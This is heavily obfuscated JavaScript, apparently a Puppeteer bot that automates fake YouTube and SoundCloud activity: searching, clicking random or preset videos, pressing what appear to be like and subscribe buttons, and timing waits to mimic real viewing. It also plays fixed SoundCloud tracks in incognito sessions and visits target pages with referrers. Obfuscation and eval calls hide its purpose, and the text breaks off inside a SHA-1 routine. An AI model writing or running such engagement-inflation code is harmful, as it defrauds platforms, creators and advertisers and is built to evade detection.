function c(b, d) {
  const e = a();
  return c = function(f, g) {
    f = f - (0x75a * -0x4 + -0x1345 + 0x30ad);
    let h = e[f];
    if (c['GvklGu'] === undefined) {
      var i = function(m) {
        const n = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let o = '',
          p = '';
        for (let q = 0x374 + 0x1a0c + 0x80 * -0x3b, r, s, t = 0x197 + 0x58 * 0x4 + -0x2f7; s = m['charAt'](t++); ~s && (r = q % (0x25b0 + -0x2123 + 0x2b * -0x1b) ? r * (-0x9fa + 0x949 + 0xf1) + s : s, q++ % (0x62 * 0x30 + -0x19d7 + 0x77b)) ? o += String['fromCharCode'](-0x3 * -0x626 + 0x237e + 0x1 * -0x34f1 & r >> (-(-0x1bf2 + 0x1353 + 0x1 * 0x8a1) * q & 0xb3c + -0x165 + -0x9d1 * 0x1)) : 0x2c * -0x4c + 0x1 * -0xcbd + -0x19cd * -0x1) {
          s = n['indexOf'](s);
        }
        for (let u = -0x51 * -0x15 + -0x1 * -0x2302 + -0x29a7, v = o['length']; u < v; u++) {
          p += '%' + ('00' + o['charCodeAt'](u)['toString'](-0x1fcf + 0x1ad7 + 0x508))['slice'](-(0x11b + 0x2694 + -0x27ad));
        }
        return decodeURIComponent(p);
      };
      c['jeZKvB'] = i, b = arguments, c['GvklGu'] = !![];
    }
    const j = e[0x3 * -0xbf + -0x1 * 0xf25 + 0x1162],
      k = f + j,
      l = b[k];
    return !l ? (h = c['jeZKvB'](h), b[k] = h) : h = l, h;
  }, c(b, d);
}
const Z = d,
  Y = b,
  X = c;

function getRandomInt(f, h) {
  const i = ceil(f);
  return floor(random() * (floor(h) - i + (0x25b0 + -0x2123 + 0x61 * -0xc))) + i;
}
async function createPage(f, h) {
  let i = await f['newPage']();
  return await i['setDefault' + 'Navigation' + 'Timeout'](-0x9fa + 0x949 + 0xb1), await i['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i;
}
async function standardGoto(f, h, i) {
  return await f['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i ? await wait(0xfc * 0x70 + -0x9b09 + 0xa1f9 + (-0x1f * -0x1c9 + 0x6a7a + 0x97 * -0xaf) * random()) : await standardWaitForNetIdle(f), await wait(-0x1bf2 + 0x1353 + 0x1 * 0x1c27 + (0x1678 + -0x2ca + -0x9b1 * -0x2) * random()), 0x2c * -0x4c + 0x1 * -0xcbd + -0x89a * -0x3;
}
async function standardWaitForNetIdle(f) {
  return await wait(-0x51 * -0x15 + -0x1 * -0x2302 + -0x161f), await f['waitForNet' + 'workIdle']({
    'idleTime': 0x1d4c,
    'timeout': 0x0
  }), -0x1fcf + 0x1ad7 + 0x4f9;
}
async function randomWait() {
  return await wait(0x11b + 0x2694 + -0x1427 + (0x3 * -0xbf + -0x1 * 0xf25 + 0x24ea) * random()), -0x1ce2 + 0x1d93 * 0x1 + 0xb * -0x10;
}
async function watchRandomFrontScreenVideo(f) {
  await f['evaluate'](() => {
    var i;
    (i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('yt-core-im' + 'age--fill-' + 'parent-hei' + 'ght\x20yt-cor' + 'e-image--f' + 'ill-parent' + '-width\x20yt-' + 'core-image' + '\x20yt-core-i' + 'mage--cont' + 'ent-mode-s' + 'cale-aspec' + 't-fill\x20yt-' + 'core-image' + '--loaded'))['slice'](-0x2bf * 0x2 + 0xe67 + -0x8e9, 0x3dc + -0x7fd + 0x7 * 0x98), i[Math['floor'](Math['random']() * i['length'])])['setAttribu' + 'te']('id', '__scope');
  }), await randomWait(), await f['click']('#__scope'), await standardWaitForNetIdle(f);
  const h = await getMaxTime(f);
  return await wait(Math['min']((0x3b * 0x681 + 0x295f * -0x2 + 0x1 * -0x429d) * getRandomInt(0x811 * -0x1 + -0xeb1 + -0x4 * -0x5b1, -0x1240 + 0x1d3 * 0xb + -0x5c * 0x5), h)), -0x169c * 0x1 + -0x214c + -0xd * -0x44d;
}
async function getMaxTime(f) {
  return await f['evaluate'](() => {
    const h = {
      'Seconds': 0x3e8,
      'Minutes': 0xea60,
      'Hours': 0x36ee80,
      'Second': 0x3e8,
      'Minute': 0xea60,
      'Hour': 0x36ee80
    };
    let i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('ytp-progre' + 'ss-bar'))['pop']()['ariaValueT' + 'ext'],
      j = -0x18ab + 0x11 * -0x133 + 0x1687 * 0x2;
    i = i['split'](i['includes']('of') ? '\x20of\x20' : ',\x20')[0x4 * -0x2c0 + -0x1849 * 0x1 + 0x234a]['split']('\x20');
    for (let k = 0x1 * -0x84d + 0xa0f + -0x1c2; k < i['length']; k += -0x1e52 + -0x938 + 0x1 * 0x278c)
      j += i[k] * h[i[k + (-0x7 * -0x6e + 0x1e1 * -0xc + 0x1 * 0x138b)]];
    return j;
  });
}
async function anchorAndView(f) {
  const R = d;
  log('goto\x20chann' + 'el\x20and\x20vie' + 'w\x20video\x20pr' + 'ocess...'), await standardGoto(f, channels['random']()), await f['click']('tp-yt-pape' + 'r-tab.styl' + 'e-scope:nt' + R(0xe) + '\x20>\x20div:nth' + '-child(1)'), log('clicked\x20vi' + 'deo\x20stuff'), await standardWaitForNetIdle(f), log('page\x20netwo' + 'rk\x20idle\x20x2'), await f['evaluate'](() => {
    const j = Array['from'](document['querySelec' + 'torAll']('#contents'))['filter'](l => 'style-scop' + 'e\x20ytd-rich' + '-grid-row' == l['getAttribu' + 'te']('class'))['slice'](-0xb4e * 0x1 + 0x22b9 + -0x1765)['map'](l => Array['from'](l['children']))['flat'](-0xcb4 * -0x1 + -0xafb * -0x1 + -0x17ae)['map'](l => l['childNodes'][0xc8e * 0x3 + -0x1ea9 + -0x700]['childNodes'][0x321 + -0x812 * 0x2 + 0xd03]['childNodes'][0x2 * -0xa33 + -0x2638 + -0x15d * -0x2b]['childNodes'][0xd * -0x161 + -0x1907 + -0x4 * -0xabd]['childNodes'][0x973 + 0x1a42 + -0x4 * 0x8ed]);
    var k;
    return (k = j)[Math['floor'](Math['random']() * k['length'])]['setAttribu' + 'te']('id', '__hookedVi' + 'dToWatch'), j['map'](l => l['href']);
  }), await wait(getRandomInt(0x2660 * 0x1 + -0x38 * 0x7a + -0x298 * 0x3, -0xfdd + -0x20 + 0x2385)), await f['click']('#__hookedV' + 'idToWatch'), await wait(0x623 * 0x3 + 0x52b6 + -0x2a87);
  const h = await getMaxTime(f),
    i = Math['min']((-0x101cc + -0x1 * -0x6543 + -0x10ff * -0x17) * getRandomInt(0x194e + -0x921 + 0x1 * -0x102b, -0x2088 + 0x17fb + 0x892), h);
  return await wait(i), 0xde8 + 0x1f9 + 0x20 * -0x7f;
}
async function frontScreenActions(f) {
  return log('going\x20to\x20f' + 'ront\x20scree' + 'n\x20and\x20clic' + 'king\x20rando' + 'm\x20video...'), await standardWaitForNetIdle(f), await randomWait(), log('click\x20atte' + 'mpt...'), await f['evaluate'](() => {
    var h;
    (h = Array['from'](document['getElement' + 'sByClassNa' + 'me']('style-scop' + 'e\x20ytd-rich' + '-grid-row'))['filter'](i => 'contents' != i['id']), h[Math['floor'](Math['random']() * h['length'])])['children'][0x1551 * -0x1 + -0x1 * -0x14c6 + 0x8b]['children'][-0x1 * -0x16e1 + 0xe03 + -0x3 * 0xc4c]['children'][-0x8be * -0x2 + -0x2351 + 0x11d5]['children'][-0x1fed * -0x1 + -0x2 * 0xde5 + -0x423]['children'][-0xbd2 + -0x22 * 0xcc + 0x26ea]['setAttribu' + 'te']('id', 'gottemezez');
  }), await randomWait(), await f['click']('#gottemeze' + 'z'), await standardWaitForNetIdle(f), await watchRandomFrontScreenVideo(f), 0x17c5 * -0x1 + -0x2ab * -0xd + 0x13 * -0x93;
}
async function searchAndView(f) {
  const T = d,
    S = b;
  log('searching\x20' + 'youtube\x20re' + 'sults'), await randomWait(), await f['evaluate'](() => {
    let j = Array['from'](document['querySelec' + 'torAll']('#search'));
    document['getElement' + 'ById']('__searchBo' + 'xReal') || j['find'](k => 'INPUT' === k['tagName'])['setAttribu' + 'te']('id', '__searchBo' + 'xReal');
  }), await f['type']('#__searchB' + 'oxReal', searchTerms[S(0xf, 'sczM')](), {
    'delay': -0x1ac9 + 0x6d * 0x33 + 0x2bb * 0x2 + (-0xb9b * 0x2 + -0x1903 + -0x306b * -0x1) * random()
  }), await wait(-0x23df + -0x19b5 * -0x1 + -0x8d * -0x16 + (-0x1c76 * -0x1 + -0xbfa * 0x3 + -0x229 * -0x4) * random()), await f['click']('#search-ic' + 'on-legacy'), await async function j() {
    if (!await f['evaluate'](() => Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['length']))
      return await j();
  }(), await standardWaitForNetIdle(f);
  let h = await f['evaluate'](() => {
    const k = {
        'seconds': 0x3e8,
        'minutes': 0xea60,
        'hours': 0x36ee80,
        'second': 0x3e8,
        'minute': 0xea60,
        'hour': 0x36ee80
      },
      l = (m = Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['map'](p => p['childNodes'][-0x2 * 0x872 + -0xc * -0x22d + -0x936]['childNodes'][-0x1c46 + 0x1893 + 0x3b4]['childNodes'][-0x1c67 + 0xf5b + 0xd0d]))[Math['floor'](Math['random']() * m['length'])];
    var m;
    const n = l['childNodes'][-0xa * -0xc1 + 0xa7f * -0x1 + -0x1 * -0x2fa]['childNodes'][-0x2 * -0xc34 + 0x6ac + 0x12 * -0x1ba]['childNodes'][-0x1596 + 0xfa * 0x5 + -0x3e * -0x45]['ariaLabel'];
    return l['setAttribu' + 'te']('id', '__hookedVi' + 'dToClick'), l['scrollInto' + 'View'](),
      function(p) {
        let q = p['split'](',\x20')['map'](u => u['split']('\x20'))['flat'](0x33 * 0x2d + -0x12b9 * 0x2 + 0x1c7c),
          r = -0x521 * 0x7 + 0x40f * -0x1 + -0x3 * -0xd52;
        for (let u = 0x1b63 + -0xa7f + -0x10e4; u < q['length']; u += 0x1e * -0x108 + -0x19 * 0x59 + 0x27a3)
          r += q[u] * k[q[u + (-0x1ac8 * -0x1 + -0x254a + 0xa83)]];
        return r;
      }(n);
  });
  await wait((-0x2dca + -0x71 * -0x49 + 0x4829) * Math['random']()), await f[T(0x4)]('#__hookedV' + 'idToClick');
  let i = Math['min']((0x1c * -0x1cd + -0x1b31e + 0x2cfea) * getRandomInt(0x1 * 0x515 + -0x23b1 * 0x1 + 0x1e9d, 0x1e * -0xae + -0x2 * -0x1052 + 0xc36 * -0x1), h + (-0x14c9 + -0x2033 + -0x222 * -0x22));
  return await wait(i), -0x28 * 0xc4 + 0x4b * 0x36 + 0xecf;
}
async function keyWatch(f) {
  const U = d;
  log('standard\x20k' + 'eyWatch...'), await standardGoto(f, 'https://ww' + 'w.youtube.' + 'com/watch?' + 'v=' + hookPlaylistPoints['random']() + ('&list=PL7D' + '9Ps0wVt5cy' + 'nwDE_CPYb6' + 'aBUkYyfi-y'), -0x1 * -0x2527 + -0x1ec5 + -0x1 * 0x662), log('clicking..' + '.'), await f['click']('#button\x20>\x20' + 'ytd-button' + '-renderer\x20' + '>\x20yt-butto' + 'n-shape\x20>\x20' + 'button\x20>\x20y' + 't-touch-fe' + 'edback-sha' + 'pe\x20>\x20div\x20>' + '\x20div.yt-sp' + 'ec-touch-f' + U(0x2) + 'ape__fill'), await f['click']('#top-level' + '-buttons-c' + 'omputed\x20>\x20' + 'ytd-toggle' + '-button-re' + 'nderer\x20>\x20y' + 't-button-s' + 'hape\x20>\x20but' + 'ton\x20>\x20yt-t' + 'ouch-feedb' + 'ack-shape\x20' + '>\x20div\x20>\x20di' + 'v.yt-spec-' + 'touch-feed' + 'back-shape' + '__fill');
  const h = setInterval(async () => {
    log('executed\x20c' + 'leanup\x20int' + 'erval,\x20che' + 'ck\x20process' + '...'), await f['evaluate'](() => {
      setTimeout(() => {
        document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')?.['offsetPare' + 'nt'] && document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')['setAttribu' + 'te']('id', '__lllll');
      }, -0x3 * -0x58f + -0x28 * 0x7d + 0xe93 + (0x1 * 0x1c64 + 0xf4 + -0x1970) * Math['random']());
    });
  }, 0x4f * -0xa + -0x1c6d + 0x3adb);
  await wait(-0xc7 * 0x6fa + -0x50960 + 0x784cb * 0x2);
  try {
    await f['click']('#__lllll');
  } catch (i) {}
  return await wait((-0x1a0b1 + -0x1 * -0xb2b7 + 0xce * 0x24b) * getRandomInt(-0x9 * -0x14c + 0x8fc + 0x1 * -0x14a4, -0x1bfc + 0xb7 + -0xdaf * -0x2)), clearInterval(h), 0x25af * 0x1 + 0x26d8 + -0x4c86;
}
async function runYTModule(f, h) {
  const i = await createPage(f, 'https://ww' + 'w.youtube.' + 'com/');
  for (await randomWait();;) {
    let j = -0x1bbf * 0x1 + -0x4 * -0x6e2 + 0x37;
    try {
      await standardWaitForNetIdle(i), await GlobalActions['random']()(i);
    } catch (k) {
      i['close']();
    }
    if (j)
      return 0x2231 + -0x1558 + -0x8 * 0x19b;
    await randomWait();
  }
  return 0x3 * 0xa5e + -0x1 * -0x679 + 0x2a * -0xe5;
}

function fetchRandomSC() {
  return Math['random']() <= -0x2f3 + 0x121f + -0xf2c + 0.5 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'long-day-r' + 'emix-prod-' + 'unnecessar' + 'y-beats?si' + '=30458c9ce' + '44c4b4eaab' + '8a3eca1b3a' + '58e&utm_so' + 'urce=clipb' + 'oard&utm_m' + 'edium=text' + '&utm_campa' + 'ign=social' + '_sharing' : Math['random']() < 0x25c9 + -0x52a + 0x4a9 * -0x7 + 0.2 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'whatnot-de' + 'mo?si=cf08' + 'c07128594b' + 'f6b3d049e1' + '680b972f&u' + 'tm_source=' + 'clipboard&' + 'utm_medium' + '=text&utm_' + 'campaign=s' + 'ocial_shar' + 'ing' : 'https://so' + 'undcloud.c' + 'om/22down/' + 'worried-ab' + 'out-the-tr' + 'uth-ft-rik' + 'anbeastly-' + 'nikkkq-cas' + 'ualcheater' + '?si=20d1c3' + '32655b4ef1' + '98a379eac0' + '05725b&utm' + '_source=cl' + 'ipboard&ut' + 'm_medium=t' + 'ext&utm_ca' + 'mpaign=soc' + 'ial_sharin' + 'g';
}
async function runGFModule(f, h) {
  async function i() {
    const V = d;
    if (doFlags['doSoundClo' + 'ud'] && Math[V(0xc)]() >= 0x2128 + 0x25fa + -0x4722 + 0.3) {
      const j = await f['createInco' + 'gnitoBrows' + 'erContext'](),
        k = await j['newPage']();
      let l = 0x13 * 0x15d + -0x56 + 0x23 * -0xbb;
      if (await k['goto'](fetchRandomSC(), {
          'timeout': NETWORK_PATIENCE
        })['catch'](m => l++), l)
        return await k['close'](), await j['close'](), i();
      try {
        const m = await k['evaluate'](() => {
          let n = document['querySelec' + 'tor']('#content\x20>' + '\x20div\x20>\x20div' + '.l-listen-' + 'hero\x20>\x20div' + '\x20>\x20div.ful' + 'lHero__for' + 'eground.fu' + 'llListenHe' + 'ro__foregr' + 'ound.sc-p-' + '4x\x20>\x20div.f' + 'ullHero__t' + 'itle\x20>\x20div' + '\x20>\x20div\x20>\x20d' + 'iv.soundTi' + 'tle__playB' + 'utton.soun' + 'dTitle__pl' + 'ayButtonHe' + 'ro.theme-l' + 'ight\x20>\x20a');
          n && 'Play' === n['textConten' + 't'] && n['click']();
        });
        await wait(0x408f + -0xe920 + -0xd * -0x1a7d + getRandomInt(-0x491e + -0x5 * -0x114a + -0x2d44 * -0x1, -0x7e4 + 0x15e7 + 0x672d));
      } catch (n) {}
      return await k['close'](), await j['close'](), i();
    } {
      const {
        url: p,
        preRef: q
      } = scriptTargets['randomFlus' + 'h'](0x2 * 0x42b + -0x1299 + 0xa44), r = await f['createInco' + 'gnitoBrows' + 'erContext'](), s = await r['newPage']();
      let u = -0x1ea5 + 0x2 * 0x1085 + 0x1 * -0x265;
      if (await s['goto'](q, {
          'timeout': NETWORK_PATIENCE
        })['catch'](w => u++), u)
        return await s['close'](), await r['close'](), i();
      const v = await s['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
      return log(v['slice'](-0x10f * 0x1 + 0x22d1 + -0x1d * 0x12a, 0x1 * -0x2187 + 0x270 + 0x1 * 0x1f49)), v['includes']('script-des' + 'cription') ? (log('p1'), await s['goto'](p, {
        'timeout': NETWORK_PATIENCE
      })['catch'](w => u++), u ? (await s['close'](), await r['close'](), i()) : (await new Promise(w => setTimeout(w, -0x229b + 0x1 * 0x571 + 0x24fa + floor((0x518 + 0x2361 + -0x353 * 0xb) * random()))), log('p2'), log(await s['evaluate'](() => {
        const W = d;
        var w, x, y, z, A, B, C, D, E = 'object' == typeof window ? window : {},
          F = !E['JS_SHA1_NO' + '_NODE_JS'] && 'object' == typeof process && process['versions'] && process['versions']['node'];
        F && (E = global), w = ('0123456789' + 'abcdef')['split'](''), x = [
          -(-0xefa8f4c6 + 0x2 * -0x1be9a6fb + -0xc * -0x234a5ae5),
          -0x3130ab + -0x2 * 0x374531 + 0x499 * 0x3e95,
          0x718c + -0x1 * -0x30ad + 0x1 * -0x2239,
          0x94 * -0x26 + -0x186e + 0x2ee6
        ], y = [
          -0x1 * 0x119 + -0x21b5 + 0x22e6,
          0x1f12 + -0x12c9 + -0x413 * 0x3,
          0x3 * -0x3cb + -0x69b * -0x1 + 0x52 * 0xf,
          -0x2323 * -0x1 + -0x17c6 + -0x1 * 0xb5d
        ], z = [
          'hex',
          'array',
          'digest',
          'arrayBuffe' + 'r'
        ], A = [], B = function(J) {
          return function(K) {
            return new G(-0x3ba * 0x8 + -0x24fd + 0x42ce)['update'](K)[J]();
          };
        }, C = function() {
          var J, K, L = B('hex');
          for (F && (L = D(L)), L['create'] = function() {
              return new G();
            }, L['update'] = function(M) {
              return L['create']()['update'](M);
            }, J = 0x2220 + 0x1912 + -0x3b32 * 0x1; J < z['length']; ++J)
            K = z[J], L[K] = B(K);
          return L;
        }, D = function(J) {
          var K = eval('require(\'crypto\');'),
            L = eval('require(\'buffer\')[\'Buffer\'];'),
            M = function(N) {
              if ('string' == typeof N)
                return K['createHash']('sha1')['update'](N, 'utf8')['digest']('hex');
              if (N['constructo' + 'r'] === ArrayBuffer)
                N = new Uint8Array(N);
              else {
                if (void(-0x8b4 * -0x1 + 0x1cf * -0xe + 0x2c5 * 0x6) === N['length'])
                  return J(N);
              }
              return K['createHash']('sha1')['update'](new L(N))['digest']('hex');
            };
          return M;
        };
        class G {
          constructor(J) {
              J ? (A[-0x2002 + 0x211b + 0x119 * -0x1] = A[-0x263 * 0x1 + -0x1 * -0x38b + -0x118] = A[-0x1074 + -0x3 * -0x74d + -0x572] = A[-0x1997 * 0x1 + 0x5 * 0x3d + 0x1868] = A[0x27a * 0xa + -0xc42 + -0xc7f] = A[-0x1188 + 0x17c9 + 0x63d * -0x1] = A[-0x1526 + 0x9 * -0x36b + 0x33ee] = A[-0x1 * 0x24d4 + -0x10 * -0xbe + 0x18fa] = A[0x1567 * 0x1 + 0x511 * -0x2 + -0xb3e] = A[-0x1aaf + 0x57c + 0x153b] = A[0x1470 + -0x1bc0 + 0x759] = A[-0x2 * -0xac + 0x1608 + -0x67 * 0x3a] = A[-0xd6 * -0x11 + 0x7f * 0x39 + -0x2a72] = A[-0xf12 + 0x4c1 + 0xa5d] = A[0x7 * -0x22e + -0x1a52 + 0x29a1] = A[0xc3d + -0x97 * -0x34 + -0x2adb] = A[-0x4a1 + 0x2 * -0x10f3 + 0x382 * 0xb] = 0x2636 + -0x15da + -0x2 * 0x82e, this['blocks'] = A) : this['blocks'] = [
                0x122 * -0x1a + 0xdd * 0x17 + 0x999,
                0x12 * 0x1e7 + 0x10f2 + -0x3330,
                0x301 * -0x4 + 0x1a26 + -0xe22,
                0x1d65 + -0x8e6 + -0x147f,
                0x265a + 0x22 * -0x44 + -0x1d52,
                -0xaf1 * -0x1 + -0x3 * 0x944 + 0x10db * 0x1,
                -0x5ec + 0x811 + 0xb7 * -0x3,
                -0x12f8 + -0x4b9 + 0x17b1,
                -0x2340 * -0x1 + 0x2 * -0x112d + 0xe6 * -0x1,
                -0x8d7 * 0x1 + 0x1273 * 0x1 + -0x99c,
                0x2601 + -0x1921 + -0x8 * 0x19c,
                -0x1f * 0xf3 + 0xdbe + 0xb * 0x16d,
                -0x1 * -0x17 + 0x9 * 0x23 + -0x152,
                -0x44 * -0x93 + 0x1d56 + -0x4462,
                0x15d0 + 0x14 * -0x1f3 + 0x7 * 0x274,
                -0x6 * -0x515 + 0x14c2 + -0x3340,
                -0xe5 * 0x13 + 0x134c + -0x24d
              ], this['h0'] = -0x90f95f12 + 0xe104846 + 0xea2e39cd, this['h1'] = -0x8fad2384 + 0x10147f00e + 0x7e32deff * 0x1, this['h2'] = -0x3707 * -0x314de + 0xf66d7ad0 + -0xc * 0x15f052d3, this['h3'] = -0x5ca8c70 * 0x1 + -0x9a3 * -0x3902 + -0x8 * -0x27af054, this['h4'] = 0x3da35 * 0x4fc6 + -0x1824df66f + 0x112cfb861, this['block'] = this['start'] = this['bytes'] = this['hBytes'] = -0x1a5c + -0x1 * -0x1517 + 0x545, this['finalized'] = this['hashed'] = -0xb * 0x83 + -0xb * -0x3 + -0x20 * -0x2c, this['first'] = 0x28a * 0xb + -0x19c3 + -0x22a;
            }
            ['update'](J) {
              var K, L, M, N, O, P;
              if (!this['finalized']) {
                for ((K = 'string' != typeof J) && J['constructo' + 'r'] === E['ArrayBuffe' + 'r'] && (J = new Uint8Array(J)), M = 0x67 * 0x45 + -0x1 * 0x12ef + -0x8d4, O = J['length'] || 0x12 * -0x204 + -0x2035 + -0x1 * -0x447d, P = this['blocks']; M < O;) {
                  if (this['hashed'] && (this['hashed'] = -0x2ed * 0xb + 0x2 * 0x10a3 + -0x117, P[0x18a5 + 0xf * 0x35 + -0x1bc0 * 0x1] = this['block'], P[-0x1d82 + -0x160f + 0x33a1] = P[0x1 * 0x25e2 + -0x1d5a + 0x25 * -0x3b] = P[-0x47 * -0x83 + -0x1 * -0x683 + 0x1 * -0x2ad6] = P[-0x1d35 * 0x1 + 0x1 * -0x1bf1 + -0x3929 * -0x1] = P[-0x4 + 0x1fd5 + -0x1fcd] = P[-0x26d2 * -0x1 + 0x166 * 0xb + 0x4ed * -0xb] = P[0x152a + 0xe2 + -0x2 * 0xb03] = P[0x22ac + 0xe0b + -0x148 * 0x26] = P[-0xf41 * 0x1 + 0x2028 + -0x10df] = P[0x10d4 + 0x1 * 0x86d + -0x1938] = P[0x45 * 0x42 + -0x2 * -0x455 + -0x8ce * 0x3] = P[0x1587 + 0x9f + -0x161b * 0x1] = P[0x2 * -0xcdc + 0x236e + -0x9aa] = P[0x1dac + -0x6 * 0x33b + -0xa3d * 0x1] = P[0x43 * -0x11 + -0xd * -0x14e + -0x3 * 0x427] = P[0x1a60 + 0xd89 + 0x27da * -0x1] = -0x88 + -0x936 + -0x2b * -0x3a), K) {
                    for (N = this['start']; M < O && N < 0x137 * 0x2 + -0x969 * -0x4 + -0x13e9 * 0x2; ++M)
                      P[N >> -0xc65 + -0x18e9 + 0x954 * 0x4] |= J[M] << y[0x3 * 0xc13 + -0x1 * 0x940 + -0xe * 0x1ed & N++];
                  } else {
                    for (N = this['start']; M < O && N < 0x11cd + 0x692 + -0x1db * 0xd; ++M)
                      (L = J['charCodeAt'](M)) < 0x1b * -0xd1 + -0x1f0b + 0x3596 ? P[N >> -0x1762 + 0xd1 + 0x1 * 0x1693] |= L << y[0x41 * 0x4 + 0xf1c + -0x19 * 0xa5 & N++] : L < 0x1f * -0x86 + -0x2491 + -0x3ccb * -0x1 ? (P[N >> 0x2527 + -0x3bd * -0x5 + -0x37d6] |= (0x1b56 + 0x2 * -0x869 + -0x5 * 0x1f4 | L >> -0x11a9 + -0x233d * 0x1 + 0x4 * 0xd3b) << y[-0x1 * 0x17 + 0x2197 + 0x1 * -0x217d & N++], P[N >> 0x1af * 0x14 + -0x5c * 0x26 + -0x1402] |= (0xc56 + 0x1 * -0x10c1 + 0x4eb | -0x2377 + 0x241a + -0x64 & L) << y[0x1383 + 0x32a + 0x2 * -0xb55 & N++]) : L < 0x1 * 0x57d2 + -0x3 * 0x2601 + 0x3 * 0x50bb || L >= -0x13ed4 + 0x2473 * 0x2 + 0x5b * 0x52a ? (P[N >> -0x1e17 + 0x261b + -0x802] |= (0x1cdf + 0x2 * -0xff3 + -0x1b * -0x25 | L >> 0x5 * 0x79d + -0x79 * -0x7 + -0x2954) << y[-0x16a6 + 0xc9a + 0xa0f & N++], P[N >> 0x455 + 0x1 * 0xdab + -0x11fe * 0x1] |= (-0x1 * -0x2035 + 0x20d5 + -0x408a | L >> 0x1a * 0xeb + 0x2280 + -0x3a58 & 0xbb * -0x6 + 0x1e43 + -0x19a2) << y[0x1c11 + -0x1 * -0x593 + -0x21a1 * 0x1 & N++], P[N >> -0xeef * -0x1 + 0x97 * 0x12 + -0x198b] |= (-0x206d + 0x16d9 + 0xa14 | 0x1 * 0xb51 + 0x1 * 0x1343 + -0x1 * 0x1e55 & L) << y[-0x15 * 0x50 + -0x34 * 0xbe + 0x2d2b & N++]) : (L = 0x49e1 * 0x1 + 0x18fe + 0x9d21 + ((-0x51 * 0x20 + 0x25dc * 0x1 + -0x17bd & L) << -0x18d3 + 0x137c + 0x561 | 0x2099 + 0x1b28 + -0x37c2 & J['charCodeAt'](++M)), P[N >> -0xa4a + -0x197e + 0x1fd * 0x12] |= (0x3 * -0x7ae + -0x43 * 0x66 + 0x5c * 0x8d | L >> -0xd * -0x110 + 0x13d7 * 0x1 + -0x2195) << y[-0x20f2 + -0x144 + 0x2239 * 0x1 & N++], P[N >> -0x1b6f + 0x2 * 0xe35 + -0x1 * 0xf9] |= (0x1662 * -0x1 + 0x50 * -0x28 + 0x2362 | L >> -0x1ed7 + 0x1 * 0x26ae + -0x1 * 0x7cb & 0x2 * 0x3c4 + -0x1 * -0x1e4d + 0x2596 * -0x1) << y[0x100e + 0x1 * 0x169f + -0x26aa & N++], P[N >> -0x23c9 * 0x1 + -0x1 * -0x266c + -0x2a1] |= (0xb29 * 0x3 + -0x2b * -0xe + -0x2355 | L >> 0x8e3 + 0x1836 + -0x2113 & -0x1511 + 0x222a + -0xcda) << y[0x1e10 + 0x3 * 0xe7 + -0x20c2 & N++], P[N >> 0x1 * -0x10fd + -0x920 + 0x1a1f] |= (0x215d + -0x1008 + -0x10d5 * 0x1 | -0x1eab + -0x107b + 0xb * 0x44f & L) << y[-0x42 * 0x18 + 0x125 + -0x1 * -0x50e & N++]);
                  }
                  this['lastByteIn' + 'dex'] = N, this['bytes'] += N - this['start'], N >= -0x1 * -0x16b6 + 0x881 * -0x1 + -0xdf5 ? (this['block'] = P[0x14 * 0x1c8 + -0xa06 * 0x1 + -0x198a], this['start'] = N - (0x1054 + 0x2586 + -0x359a), this['hash'](), this['hashed'] = -0x3d2 + 0x248e + 0x15 * -0x18f) : this['start'] = N;
                }
                return this['bytes'] > -0x789a4 * 0x13c9 + 0x5 * -0x2f1e8c73 + 0x5a * 0x71e85a5 && (this['hBytes'] += this['bytes'] / (0x10d8e5188 + 0x9cf60b58 + 0xa7bb8 * -0x1044) << -0x115e + -0x2 * 0x33 + 0x11c4, this['bytes'] = this['bytes'] % (0x233 * -0x74d928 + -0x80fc9b48 + 0x3a5c32c0 * 0xb)), this;
              }
            }
            ['finalize']() {
              if (!this['finalized']) {
                this['finalized'] = -0x2665 + -0x70b * -0x2 + 0x1850;
                var J = this['blocks'],
                  K = this['lastByteIn' + 'dex'];
                J[0x1f3 * 0x6 + -0x1f39 + 0x1 * 0x1397] = this['block'], J[K >> -0x2625 + -0x26bd + 0x85 * 0x94] |= x[-0x1 * 0x189b + 0x3cc * -0x3 + 0x16 * 0x1a3 & K], this['block'] = J[0x7 * -0x20b + -0xf * -0x98 + 0x575], K >= -0x794 * -0x1 + -0x655 * 0x2 + 0x54e && (this['hashed'] || this['hash'](), J[0x211 + -0x4d5 + 0x2c4] = this['block'], J[0xe82 + 0x2 * 0xb93 + -0x2598] = J[-0x1 * -0x611 + -0x95c + 0x34c] = J[-0x149e + 0x3 * -0x9bb + -0x6d * -0x75] = J[-0x81e * -0x4 + 0x1 * 0x18f3 + -0x3968] = J[-0x3 * -0x7ed + 0x1 * -0x1c2b + 0x468] = J[-0x227e + -0x228c + -0x1 * -0x450f] = J[-0xc2a + -0x1 * -0x2569 + -0x1939] = J[0x269 * 0x5 + -0x176 + -0xa90] = J[0x51 * 0x5b + -0x15 * 0x12c + 0x427 * -0x1] = J[-0x1343 + 0x1 * 0x1f09 + 0xbbd * -0x1] = J[-0x101 * -0x25 + 0x324 + 0x283f * -0x1] = J[0x1a58 + -0x8ff * -0x2 + -0x2c4b * 0x1] = J[-0x22ad + -0x1b * 0xf9 + 0x1e7e * 0x2] = J[-0x4 * 0x3a6 + 0x1f8a + 0xad * -0x19] = J[0x16f2 + -0x16d9 + -0xb] = J[0x8c4 + -0x1b7e * -0x1 + -0x2433] = 0x664 * -0x6 + 0xdf1 + -0x1 * -0x1867), J[-0x1 * 0x115f + 0xfb * 0x16 + -0x425] = this['hBytes'] << -0x1 * -0x1079 + -0x3 * 0x6b9 + 0x3b5 | this['bytes'] >>> 0x1612 + 0x45f + 0xa * -0x2a2, J[0x21e + 0x1582 + 0x3 * -0x7db] = this['bytes'] << -0xbbb + -0x1f73 + 0x2b31 * 0x1, this['hash']();
              }
            }
            ['hash']() {
              var J, K, L = this['h0'],
                M = this['h1'],
                N = this['h2'],
                O = this['h3'],
                P = this['h4'],
                Q = this['blocks'];
